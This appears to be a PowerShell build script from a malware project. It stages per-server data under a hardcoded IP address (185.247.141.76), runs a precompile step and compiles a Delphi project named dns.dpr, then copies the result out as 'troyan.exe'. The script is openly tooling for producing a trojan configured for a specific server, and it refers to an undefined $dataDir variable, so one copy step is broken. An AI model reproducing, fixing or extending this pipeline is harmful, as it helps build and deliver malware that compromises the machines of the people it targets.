param (
    [string]$serverName
)

$serverName="185.247.141.76"

if ([string]::IsNullOrEmpty($serverName)) {
        throw "-serverName argument is null"
}

$scriptDir = Split-Path -Parent $MyInvocation.MyCommand.Path
$currentDir = (Join-Path -Path $scriptDir -ChildPath "current")
if (Test-Path $currentDir) {
    Remove-Item -Path $currentDir -Recurse -Force
    Write-Output "Folder and its contents have been deleted."
}
$serverFolder = Resolve-Path -Path (Join-Path -Path $scriptDir -ChildPath "data/$serverName")

if (-not (Test-Path $currentDir)) {
    New-Item -Path $currentDir -ItemType Directory
}
Copy-Item -Path (Join-Path -Path $serverFolder -ChildPath "*") -Destination $currentDir -Recurse -Force

. .\current.ps1
$scriptDir = Split-Path -Parent $MyInvocation.MyCommand.Path
$troyanDir = Resolve-Path -Path (Join-Path -Path $scriptDir -ChildPath "/troyan/troyandelphi")
& (Join-Path -Path $troyanDir -ChildPath "./precompile.ps1")

#compile troyan
$dprFile = Join-Path -Path $troyanDir -ChildPath "dns.dpr"
& "C:\Program Files (x86)\Borland\Delphi7\Bin\dcc32.exe" "$dprFile"
$exeFile = Join-Path -Path $troyanDir -ChildPath "dns.exe"
$currentExeFile = Join-Path -Path $dataDir -ChildPath "troyan.exe"
Copy-Item -Path $exeFile -Destination $currentExeFile -Force

Copy-Item -Path (Join-Path -Path $currentDir -ChildPath "*") -Destination $serverFolder -Recurse -Force